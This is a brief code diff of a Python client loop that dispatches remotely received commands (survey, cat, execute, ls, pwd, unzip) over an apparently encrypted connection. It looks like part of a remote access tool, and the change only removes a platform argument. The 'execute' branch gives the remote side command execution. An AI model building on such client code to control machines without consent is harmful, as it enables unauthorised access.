@@ -65,16 +65,16 @@ def client_loop(conn, dhkey):
             results = survey.run(PLAT)
 
         elif cmd == 'cat':
-            results = toolkit.cat(action, PLAT)
+            results = toolkit.cat(action)
 
         elif cmd == 'execute':
             results = toolkit.execute(action)
 
         elif cmd == 'ls':
-            results = toolkit.ls(action, PLAT)
+            results = toolkit.ls(action)
 
         elif cmd == 'pwd':
-            results = toolkit.pwd(PLAT)
+            results = toolkit.pwd()
 
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
